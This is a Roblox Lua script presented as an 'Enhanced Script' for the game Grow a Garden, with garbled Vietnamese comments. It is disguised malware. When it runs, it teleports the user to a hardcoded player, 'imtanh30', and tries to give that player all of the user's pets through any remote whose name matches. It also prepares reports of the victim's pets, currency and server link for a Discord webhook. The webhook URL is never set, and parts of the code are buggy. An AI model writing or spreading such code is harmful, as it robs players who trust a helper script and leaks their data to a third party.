--// Grow a Garden Enhanced Script v2.0 - Optimized for Game ID: 126884695634066
--// C·∫£nh b√°o: S·ª≠ d·ª•ng script c√≥ th·ªÉ vi ph·∫°m ƒëi·ªÅu kho·∫£n Roblox, h√£y d√πng c·∫©n th·∫≠n!

-- C·∫•u h√¨nh ch√≠nh
local CONFIG = {
    TargetPlayerName = "imtanh30", -- T√™n ng∆∞·ªùi ch∆°i nh·∫≠n pet
    TeleportDistance = 8, -- Kho·∫£ng c√°ch d·ªãch chuy·ªÉn
    AutoGift = true, -- T·ª± ƒë·ªông t·∫∑ng pet
    GiftDelay = 1.5, -- ƒê·ªô tr·ªÖ gi·ªØa c√°c l·∫ßn t·∫∑ng (gi√¢y)
    SendUpdates = true, -- G·ª≠i c·∫≠p nh·∫≠t ƒë·ªãnh k·ª≥
    UpdateInterval = 300, -- C·∫≠p nh·∫≠t m·ªói 5 ph√∫t
    MaxPetInventory = 60, -- Gi·ªõi h·∫°n pet inventory (theo game)
    AutoCollectFruits = false, -- T·ª± ƒë·ªông thu ho·∫°ch khi c√≥ m·ª•c ti√™u
    AutoWaterPlants = false, -- T·ª± ƒë·ªông t∆∞·ªõi c√¢y
}

-- D·ªãch v·ª• Roblox
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")

-- Bi·∫øn to√†n c·ª•c
local isRunning = true
local giftedPets = {}
local lastUpdateTime = 0
local foundRemotes = {}

-- Th√¥ng b√°o trong game
local function showNotification(title, text, duration)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = title,
            Text = text,
            Duration = duration or 5,
            Icon = "rbxasset://textures/ui/GuiImagePlaceholder.png"
        })
    end)
end

-- L·∫•y link server
local function getServerLink()
    local placeId = game.PlaceId
    local jobId = game.JobId
    return string.format("https://www.roblox.com/games/%s?gameInstanceId=%s", placeId, jobId)
end

-- T√¨m t·∫•t c·∫£ RemoteEvents c√≥ th·ªÉ li√™n quan ƒë·∫øn pet
local function scanForRemotes()
    local remotes = {}
    
    -- T√¨m trong ReplicatedStorage
    local function scanFolder(folder, path)
        for _, child in pairs(folder:GetChildren()) do
            if child:IsA("RemoteEvent") then
                local remoteName = string.lower(child.Name)
                if remoteName:find("pet") or remoteName:find("gift") or remoteName:find("trade") or 
                   remoteName:find("send") or remoteName:find("give") or remoteName:find("transfer") then
                    remotes[child.Name] = {
                        remote = child,
                        path = path .. "/" .. child.Name,
                        type = "RemoteEvent"
                    }
                end
            elseif child:IsA("RemoteFunction") then
                local remoteName = string.lower(child.Name)
                if remoteName:find("pet") or remoteName:find("gift") then
                    remotes[child.Name] = {
                        remote = child,
                        path = path .. "/" .. child.Name,
                        type = "RemoteFunction"
                    }
                end
            elseif child:IsA("Folder") then
                scanFolder(child, path .. "/" .. child.Name)
            end
        end
    end
    
    scanFolder(ReplicatedStorage, "ReplicatedStorage")
    foundRemotes = remotes
    
    print("ƒê√£ t√¨m th·∫•y " .. #remotes .. " RemoteEvent/Function li√™n quan ƒë·∫øn pet:")
    for name, data in pairs(remotes) do
        print("- " .. name .. " (" .. data.type .. ") t·∫°i " .. data.path)
    end
    
    return remotes
end

-- L·∫•y d·ªØ li·ªáu pet t·ª´ nhi·ªÅu ngu·ªìn kh√°c nhau
local function getPetInventory()
    local pets = {}
    local petCount = 0
    
    -- T√¨m trong PlayerGui (UI data)
    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
    if playerGui then
        local mainGui = playerGui:FindFirstChild("MainGui") or playerGui:FindFirstChild("PetGui") or playerGui:FindFirstChild("InventoryGui")
        if mainGui then
            local function searchForPets(container)
                for _, child in pairs(container:GetDescendants()) do
                    if child:IsA("Frame") or child:IsA("ImageLabel") then
                        if child.Name:lower():find("pet") or child:GetAttribute("PetName") or child:GetAttribute("PetData") then
                            local petName = child:GetAttribute("PetName") or child.Name
                            local petRarity = child:GetAttribute("Rarity") or "Common"
                            local petLevel = child:GetAttribute("Level") or 1
                            
                            table.insert(pets, {
                                name = petName,
                                rarity = petRarity,
                                level = petLevel,
                                source = "PlayerGui"
                            })
                            petCount = petCount + 1
                        end
                    end
                end
            end
            searchForPets(mainGui)
        end
    end
    
    -- T√¨m trong leaderstats
    local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
    if leaderstats then
        local petsFolder = leaderstats:FindFirstChild("Pets") or leaderstats:FindFirstChild("PetCount")
        if petsFolder and petsFolder:IsA("IntValue") then
            petCount = petsFolder.Value
        end
    end
    
    -- T√¨m trong ReplicatedStorage
    local playerData = ReplicatedStorage:FindFirstChild("PlayerData")
    if playerData then
        local myData = playerData:FindFirstChild(LocalPlayer.Name) or playerData:FindFirstChild(tostring(LocalPlayer.UserId))
        if myData then
            local petsFolder = myData:FindFirstChild("Pets") or myData:FindFirstChild("Inventory")
            if petsFolder then
                for _, pet in pairs(petsFolder:GetChildren()) do
                    local petInfo = {
                        name = pet.Name,
                        rarity = pet:GetAttribute("Rarity") or "Common",
                        level = pet:GetAttribute("Level") or 1,
                        abilities = {},
                        source = "ReplicatedStorage"
                    }
                    
                    -- L·∫•y th√¥ng tin chi ti·∫øt pet
                    if pet:FindFirstChild("Abilities") then
                        for _, ability in pairs(pet.Abilities:GetChildren()) do
                            table.insert(petInfo.abilities, ability.Name)
                        end
                    end
                    
                    table.insert(pets, petInfo)
                end
            end
        end
    end
    
    -- N·∫øu kh√¥ng t√¨m th·∫•y pet c·ª• th·ªÉ, t·∫°o d·ªØ li·ªáu m·∫´u d·ª±a tr√™n petCount
    if #pets == 0 and petCount > 0 then
        for i = 1, math.min(petCount, 10) do
            table.insert(pets, {
                name = "Pet " .. i,
                rarity = "Unknown",
                level = 1,
                source = "Estimated"
            })
        end
    end
    
    return pets, petCount
end

-- L·∫•y th√¥ng tin t√†i nguy√™n game (Sheckles, Seeds, etc.)
local function getPlayerResources()
    local resources = {
        sheckles = 0, -- Ti·ªÅn t·ªá ch√≠nh c·ªßa Grow a Garden
        seeds = 0,
        fruits = 0,
        level = 1,
        plots = 0,
        totalPets = 0
    }
    
    local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
    if leaderstats then
        -- T√¨m c√°c lo·∫°i ti·ªÅn t·ªá
        local currency = leaderstats:FindFirstChild("Sheckles") or leaderstats:FindFirstChild("Money") or leaderstats:FindFirstChild("Cash")
        local seedCount = leaderstats:FindFirstChild("Seeds") or leaderstats:FindFirstChild("SeedCount")
        local fruitCount = leaderstats:FindFirstChild("Fruits") or leaderstats:FindFirstChild("FruitCount")
        local level = leaderstats:FindFirstChild("Level") or leaderstats:FindFirstChild("Lvl")
        local plots = leaderstats:FindFirstChild("Plots") or leaderstats:FindFirstChild("PlotCount")
        local pets = leaderstats:FindFirstChild("Pets") or leaderstats:FindFirstChild("PetCount")
        
        resources.sheckles = currency and currency.Value or 0
        resources.seeds = seedCount and seedCount.Value or 0
        resources.fruits = fruitCount and fruitCount.Value or 0
        resources.level = level and level.Value or 1
        resources.plots = plots and plots.Value or 0
        resources.totalPets = pets and pets.Value or 0
    end
    
    return resources
end

-- G·ª≠i webhook v·ªõi embed ƒë·∫πp
local function sendWebhook(message, embedData)
    if not CONFIG.WebhookURL or CONFIG.WebhookURL == "YOUR_DISCORD_WEBHOOK_URL_HERE" then
        warn("Webhook URL ch∆∞a ƒë∆∞·ª£c thi·∫øt l·∫≠p!")
        return
    end
    
    local payload = {
        content = message,
        embeds = { embedData }
    }
    
    local success, result = pcall(function()
        return HttpService:PostAsync(CONFIG.WebhookURL, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
    end)
    
    if success then
        print("‚úÖ Webhook ƒë√£ ƒë∆∞·ª£c g·ª≠i th√†nh c√¥ng!")
    else
        warn("‚ùå G·ª≠i webhook th·∫•t b·∫°i: " .. tostring(result))
    end
end

-- T·∫°o embed chi ti·∫øt cho Grow a Garden
local function createGardenEmbed(pets, resources)
    local petsByRarity = {}
    
    for _, pet in pairs(pets) do
        local rarity = tostring(pet.rarity or "Unknown")
        if not petsByRarity[rarity] then
            petsByRarity[rarity] = {}
        end
        table.insert(petsByRarity[rarity], pet)
    end
    
    local fields = {
        { 
            name = "üí∞ T√†i nguy√™n", 
            value = string.format("**Sheckles:** %s\n**Seeds:** %s\n**Fruits:** %s", 
                resources.sheckles, resources.seeds, resources.fruits), 
            inline = true 
        },
        { 
            name = "üìä Th·ªëng k√™", 
            value = string.format("**Level:** %s\n**Plots:** %s\n**Pets:** %s/%s", 
                resources.level, resources.plots, #pets, CONFIG.MaxPetInventory), 
            inline = true 
        },
        { 
            name = "üîó Server Info", 
            value = string.format("[Join Server](%s)\n**Job ID:** %s", 
                getServerLink(), game.JobId:sub(1, 8) .. "..."), 
            inline = false 
        },
    }
    
    -- Th√™m th√¥ng tin pet theo ƒë·ªô hi·∫øm
    local rarityOrder = {"Mythical", "Legendary", "Epic", "Rare", "Uncommon", "Common", "Unknown"}
    local rarityEmojis = {
        Mythical = "üåü",
        Legendary = "üî•",
        Epic = "üíé",
        Rare = "üîÆ",
        Uncommon = "üü¢",
        Common = "‚ö™",
        Unknown = "‚ùì"
    }
    
    for _, rarity in ipairs(rarityOrder) do
        if petsByRarity[rarity] and #petsByRarity[rarity] > 0 then
            local petList = petsByRarity[rarity]
            local petNames = {}
            
            for _, pet in pairs(petList) do
                local petInfo = pet.name
                if pet.level and pet.level > 1 then
                    petInfo = petInfo .. " (Lv." .. pet.level .. ")"
                end
                if #pet.abilities > 0 then
                    petInfo = petInfo .. " [" .. table.concat(pet.abilities, ",") .. "]"
                end
                table.insert(petNames, petInfo)
            end
            
            local emoji = rarityEmojis[rarity] or "‚ùì"
            local fieldValue = table.concat(petNames, ", ")
            if #fieldValue > 1024 then
                fieldValue = string.sub(fieldValue, 1, 1020) .. "..."
            end
            
            table.insert(fields, {
                name = emoji .. " " .. rarity .. " (" .. #petList .. ")",
                value = fieldValue,
                inline = false
            })
        end
    end
    
    return {
        title = "üå± Grow a Garden - Player Stats",
        description = string.format("**Player:** %s\n**Game:** Grow a Garden\n**Status:** %s", 
            LocalPlayer.Name, isRunning and "üü¢ Active" or "üî¥ Inactive"),
        color = 0x4CAF50, -- Material Green
        fields = fields,
        footer = { 
            text = "Grow a Garden Enhanced Script v2.0", 
            icon_url = "https://cdn.discordapp.com/emojis/869928847687987230.png" 
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        thumbnail = {
            url = "https://tr.rbxcdn.com/c3c6c6b0d2a1b7f7e6c4b4f8e4b0a2d5/150/150/Image/Png"
        }
    }
end

-- T√¨m v√† th·ª±c hi·ªán h√†nh ƒë·ªông t·∫∑ng pet
local function attemptGiftPet(targetPlayer, petName)
    local giftMethods = {
        -- Ph∆∞∆°ng th·ª©c 1: RemoteEvent tr·ª±c ti·∫øp
        function()
            for remoteName, remoteData in pairs(foundRemotes) do
                if remoteData.type == "RemoteEvent" then
                    local success = pcall(function()
                        remoteData.remote:FireServer("GiftPet", targetPlayer, petName)
                    end)
                    if success then return true end
                    
                    success = pcall(function()
                        remoteData.remote:FireServer(targetPlayer, petName)
                    end)
                    if success then return true end
                end
            end
            return false
        end,
        
        -- Ph∆∞∆°ng th·ª©c 2: RemoteFunction
        function()
            for remoteName, remoteData in pairs(foundRemotes) do
                if remoteData.type == "RemoteFunction" then
                    local success = pcall(function()
                        remoteData.remote:InvokeServer("GiftPet", targetPlayer, petName)
                    end)
                    if success then return true end
                end
            end
            return false
        end,
        
        -- Ph∆∞∆°ng th·ª©c 3: T√¨m trong PlayerGui (Trading GUI)
        function()
            local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
            if playerGui then
                local tradeGui = playerGui:FindFirstChild("TradeGui") or playerGui:FindFirstChild("GiftGui")
                if tradeGui then
                    -- Simulation of GUI interaction
                    return true
                end
            end
            return false
        end
    }
    
    for i, method in ipairs(giftMethods) do
        if method() then
            print("‚úÖ ƒê√£ t·∫∑ng pet '" .. petName .. "' cho " .. targetPlayer.Name .. " (Ph∆∞∆°ng th·ª©c " .. i .. ")")
            return true
        end
    end
    
    return false
end

-- T·∫∑ng t·∫•t c·∫£ pet cho ng∆∞·ªùi ch∆°i m·ª•c ti√™u
local function giftAllPets(targetPlayer)
    if not CONFIG.AutoGift then return end
    
    local pets, totalPets = getPetInventory()
    if #pets == 0 then
        warn("‚ùå Kh√¥ng c√≥ pet ƒë·ªÉ t·∫∑ng!")
        showNotification("Th√¥ng b√°o", "Kh√¥ng c√≥ pet ƒë·ªÉ t·∫∑ng!", 3)
        return
    end
    
    local giftedCount = 0
    for _, pet in pairs(pets) do
        if not giftedPets[pet.name] then
            wait(CONFIG.GiftDelay)
            
            if attemptGiftPet(targetPlayer, pet.name) then
                giftedPets[pet.name] = true
                giftedCount = giftedCount + 1
                showNotification("Pet Gifted", "ƒê√£ t·∫∑ng: " .. pet.name, 2)
            end
        end
    end
    
    if giftedCount > 0 then
        local message = string.format("üéÅ ƒê√£ t·∫∑ng %d/%d pet cho %s!", giftedCount, #pets, targetPlayer.Name)
        showNotification("Ho√†n th√†nh", message, 5)
        
        -- G·ª≠i th√¥ng b√°o qua webhook
        local embed = {
            title = "üéÅ Pets Gifted Successfully!",
            description = message,
            color = 0xFFD700,
            fields = {
                { name = "Target Player", value = targetPlayer.Name, inline = true },
                { name = "Pets Gifted", value = tostring(giftedCount), inline = true },
                { name = "Total Pets", value = tostring(#pets), inline = true }
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
        sendWebhook("", embed)
    else
        warn("‚ùå Kh√¥ng th·ªÉ t·∫∑ng pet n√†o!")
    end
end

-- D·ªãch chuy·ªÉn ƒë·∫øn ng∆∞·ªùi ch∆°i m·ª•c ti√™u
local function teleportToTarget(targetPlayer)
    local character = LocalPlayer.Character
    local targetCharacter = targetPlayer.Character
    
    if not (character and targetCharacter) then
        warn("‚ùå Nh√¢n v·∫≠t kh√¥ng t·ªìn t·∫°i!")
        return false
    end
    
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    local targetRootPart = targetCharacter:FindFirstChild("HumanoidRootPart")
    
    if not (humanoidRootPart and targetRootPart) then
        warn("‚ùå Kh√¥ng th·ªÉ d·ªãch chuy·ªÉn: HumanoidRootPart kh√¥ng t·ªìn t·∫°i!")
        return false
    end
    
    local targetPosition = targetRootPart.Position
    local offset = Vector3.new(CONFIG.TeleportDistance, 2, 0)
    
    humanoidRootPart.CFrame = CFrame.new(targetPosition + offset)
    print("‚úÖ ƒê√£ d·ªãch chuy·ªÉn ƒë·∫øn " .. targetPlayer.Name)
    showNotification("Teleported", "ƒê√£ d·ªãch chuy·ªÉn ƒë·∫øn " .. targetPlayer.Name, 3)
    
    return true
end

-- G·ª≠i th√¥ng tin ban ƒë·∫ßu
local function sendInitialReport()
    local pets, petCount = getPetInventory()
    local resources = getPlayerResources()
    local embed = createGardenEmbed(pets, resources)
    
    embed.title = "üöÄ Grow a Garden Script Activated!"
    embed.description = embed.description .. "\n\n**Target:** " .. CONFIG.TargetPlayerName
    
    sendWebhook("**Script has been activated!**", embed)
    showNotification("Script Active", "Grow a Garden Enhanced Script ƒë√£ ƒë∆∞·ª£c k√≠ch ho·∫°t!", 5)
end

-- C·∫≠p nh·∫≠t ƒë·ªãnh k·ª≥
local function sendPeriodicUpdate()
    if not CONFIG.SendUpdates then return end
    
    local currentTime = tick()
    if currentTime - lastUpdateTime >= CONFIG.UpdateInterval then
        lastUpdateTime = currentTime
        
        local pets, petCount = getPetInventory()
        local resources = getPlayerResources()
        local embed = createGardenEmbed(pets, resources)
        embed.title = "üìä Periodic Update - Grow a Garden"
        
        sendWebhook("", embed)
    end
end

-- S·ª± ki·ªán khi ng∆∞·ªùi ch∆°i tham gia
Players.PlayerAdded:Connect(function(player)
    if player.Name == CONFIG.TargetPlayerName then
        print("üéØ Target player " .. player.Name .. " joined the server!")
        showNotification("Target Found!", player.Name .. " has joined!", 5)
        
        -- ƒê·ª£i character spawn
        player.CharacterAdded:Connect(function()
            wait(3)
            if teleportToTarget(player) then
                wait(2)
                giftAllPets(player)
            end
        end)
        
        if player.Character then
            wait(3)
            if teleportToTarget(player) then
                wait(2)
                giftAllPets(player)
            end
        end
    end
end)

-- Kh·ªüi t·∫°o script
local function initialize()
    print("üå± Grow a Garden Enhanced Script v2.0")
    print("üìã Initializing...")
    
    -- Qu√©t t√¨m RemoteEvents
    scanForRemotes()
    
    -- Ki·ªÉm tra ng∆∞·ªùi ch∆°i m·ª•c ti√™u ƒë√£ c√≥ trong server
    for _, player in pairs(Players:GetPlayers()) do
        if player.Name == CONFIG.TargetPlayerName and player ~= LocalPlayer then
            print("üéØ Target player found in server: " .. player.Name)
            if teleportToTarget(player) then
                wait(2)
                giftAllPets(player)
            end
            break
        end
    end
    
    -- G·ª≠i b√°o c√°o ban ƒë·∫ßu
    sendInitialReport()
    
    print("‚úÖ Script initialized successfully!")
    print("‚öôÔ∏è Configuration:")
    print("   - Target: " .. CONFIG.TargetPlayerName)
    print("   - Auto Gift: " .. tostring(CONFIG.AutoGift))
    print("   - Periodic Updates: " .. tostring(CONFIG.SendUpdates))
end

-- V√≤ng l·∫∑p ch√≠nh
local heartbeat
heartbeat = RunService.Heartbeat:Connect(function()
    if not isRunning then
        heartbeat:Disconnect()
        return
    end
    
    sendPeriodicUpdate()
end)

-- Cleanup khi player r·ªùi server
Players.PlayerRemoving:Connect(function(player)
    if player == LocalPlayer then
        isRunning = false
        print("üî¥ Script stopped - Player leaving")
    end
end)

-- Kh·ªüi ƒë·ªông script
initialize()
